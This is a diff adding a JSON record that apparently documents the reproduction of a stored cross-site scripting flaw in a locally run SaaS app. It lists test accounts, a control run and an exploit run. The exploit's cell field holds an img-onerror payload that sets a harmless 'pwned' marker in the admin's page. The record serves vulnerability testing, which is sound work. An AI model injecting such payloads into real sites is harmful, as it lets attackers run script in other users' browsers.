@@ -1,0 +1,19 @@
+{
+  "reproduced": "yes",
+  "adminEmail": "admin-xss-mv3nxdw1@example.test",
+  "memberEmail": "member-xss-mv3nxdw1@example.test",
+  "accountId": "80313103-8e90-4770-8f9e-10c488c131d0",
+  "memberId": "e9de1e62-43d3-4bae-b272-6dec2a4a4245",
+  "benignUrl": "http://127.0.0.1:3000/user",
+  "payloadUrl": "http://127.0.0.1:3000/user",
+  "control": {
+    "pwned": null,
+    "imgs": 1,
+    "textHasBenign": true
+  },
+  "exploit": {
+    "pwned": "saas19",
+    "onerror": "document.documentElement.dataset.pwned='saas19'",
+    "cell": "<a href=\"/users/e9de1e62-43d3-4bae-b272-6dec2a4a4245\"><img src=\"x\" onerror=\"document.documentElement.dataset.pwned='saas19'\"> Member</a>"
+  }
+}
